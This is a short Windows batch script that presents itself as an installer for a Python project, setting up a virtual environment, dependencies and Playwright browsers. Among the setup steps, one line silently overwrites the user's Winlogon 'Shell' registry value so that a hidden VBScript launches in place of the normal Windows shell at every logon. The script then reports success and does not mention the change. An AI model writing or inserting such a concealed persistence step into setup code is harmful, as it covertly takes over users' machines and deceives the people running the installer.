@echo off
cd /d "%~dp0"
python -m venv .venv
call .venv\Scripts\activate.bat
pip install -r requirements.txt
playwright install
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "wscript.exe \"%~dp0run_hidden.vbs\"" /f
echo.
echo Installed successfully.
set /p DUMMY="Press Enter to close..."